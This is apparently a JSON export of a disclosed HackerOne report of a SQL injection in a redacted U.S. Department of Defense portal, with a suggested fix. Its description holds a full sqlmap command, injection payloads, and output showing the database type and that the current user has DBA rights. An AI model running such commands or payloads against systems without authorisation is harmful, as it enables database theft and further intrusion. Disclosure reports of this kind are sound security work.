{
  "id": 384397,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODQzOTc=",
  "url": "https://hackerone.com/reports/384397",
  "title": "SQL Injection vulnerability located at ████████",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2018-07-19T21:42:37.010Z",
  "submitted_at": "2018-07-19T21:42:37.010Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "rootaccess",
    "url": "/rootaccess",
    "profile_picture_urls": {
      "small": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MTM5MTQyOSwicHVyIjoiYmxvYl9pZCJ9fQ==--704ab3f8f5953547256c84a007c249e3dd312ced/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJncmF2aXR5IjoiQ2VudGVyIiwicmVzaXplIjoiNjJ4NjJeIiwiY3JvcCI6IjYyeDYyKzArMCJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--a4d91faed3dff6024dfc1a7b7f8ccc6b45e38396/redteam-resize.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-08-15T17:08:48.095Z",
  "bug_reporter_agreed_on_going_public_at": "2019-07-11T16:50:13.535Z",
  "team_member_agreed_on_going_public_at": "2019-08-15T17:08:48.023Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:**\nI have found a SQL Injection at ███████ in the ████ Portal.\n\n**Description:**\nThe SQL injection is being caused by the unsanitized parameter of `_itemID=` i immediately  stopped testing when i verified it was possible to get the Current user and version of the Database.\n\n1.The vulnerable url is : \n`https://█████/███Portal/█████?_██████=true&_st=&_pageLabel=█████████_███████_pubview_page&CCD_itemID=201826*` \n2. use sqlmap (https://github.com/sqlmapproject/sqlmap) with the following command \n\n```python\npython sqlmap.py -u \"https://██████/████████Portal/██████████?_█████=true&_st=&_pageLabel=███_██████_pubview_page&CCD_itemID=201826*\" --random-agent --current-user --is-dba\n```\nsqlmap output : \n```\n---\nParameter: #1* (URI)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: https://███████:443/███████Portal/████?_███=true&_st=&_pageLabel=███_█████_pubview_page&CCD_itemID=201826 AND 2833=2833\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 2 columns\n    Payload: https://██████████:443/████Portal/██████████?_███=true&_st=&_pageLabel=███_██████████_pubview_page&CCD_itemID=201826 UNION ALL SELECT NULL,CONCAT(CONCAT('qvzxq','ODiUngdWPubxHGXaEEDvfcozGjVAMxIqpHmWfTVJ'),'qbbxq') FROM VERSIONS-- AQYh\n---\n[22:37:56] [INFO] testing SAP MaxDB\n[22:37:57] [WARNING] the back-end DBMS is not SAP MaxDB\n[22:37:57] [INFO] testing MySQL\n[22:37:58] [WARNING] the back-end DBMS is not MySQL\n[22:37:58] [INFO] testing Oracle\n[22:37:59] [INFO] confirming Oracle\n[22:38:01] [INFO] the back-end DBMS is Oracle\nweb application technology: Apache, Servlet 2.5, JSP, JSP 2.1\nback-end DBMS: Oracle\n[22:38:01] [INFO] fetching current user\ncurrent user:    ██████████\n[22:38:02] [INFO] testing if current user is DBA\ncurrent user is DBA:    True\n```\n\n##Screenshot\n\n{F322498}\n\n## Suggested Mitigation/Remediation Actions\nSanitize the parameter of `_itemID=` through the use of prepared statements, or other forms of sanitizing.\n\n## Impact\n\nIt could be possible for an attacker to Retrieve data, and depending of the data being stored in the database(passwords) it could be possible to further pivot, and get RCE since the current user in the database has DBA rights.",
  "weakness": {
    "id": 67,
    "name": "SQL Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 45,
  "voters": [
    "chux",
    "arkaic",
    "renekroka",
    "spam404",
    "0-1",
    "dastan_9408",
    "eveeez",
    "lumbridge",
    "smodnix",
    "chr0ll0xo",
    "and 35 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
